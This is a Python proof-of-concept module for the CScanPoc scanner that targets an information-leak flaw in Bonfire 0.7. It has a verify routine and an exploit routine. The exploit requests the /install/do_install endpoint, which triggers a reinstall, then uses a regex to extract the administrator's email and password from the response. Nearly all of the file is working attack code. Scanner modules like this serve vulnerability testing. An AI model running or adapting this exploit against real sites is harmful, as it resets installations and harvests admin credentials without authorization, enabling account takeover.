# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'Bonfire_0001_p' # 平台漏洞编号，留空
    name = 'Bonfire 0.7 /install.php 信息泄露' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-04-23'  # 漏洞公布时间
    desc = '''
        由于install.php安装文件对已安装的程序进行检测后没有做好后续处理，导致执行/install/do_install的时候引发重安装而暴露管理员信息。
    ''' # 漏洞描述
    ref = 'http://www.mehmetince.net/ci-bonefire-reinstall-admin-account-vulnerability-analysis-exploit/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'Bonfire'  # 漏洞应用名称
    product_version = '0.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8751c4c1-d055-485a-8e47-aa1cfa17f4cf'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())


    def verify(self):
        try:
            verify_url = '{target}/index.php/install/do_install'.format(target=self.target)  
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            request = requests.get(verify_url)

            if request.status_code == 200 and "do_install" in request.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))

            verify_url = '{target}/index.php/install/do_install'.format(target=self.target)       
            request = requests.get(verify_url)

            r = request.text
            regular = re.findall('Your Email:\s+<b>(.*?)</b><br/>\s+Password:\s+<b>(.*?)</b>', r)

            if regular:
                exploit_data = regular[0]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名和密码为{data}'.format(target=self.target,name=self.vuln.name,data=exploit_data))
        
        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        

if __name__ == '__main__':
    Poc().run()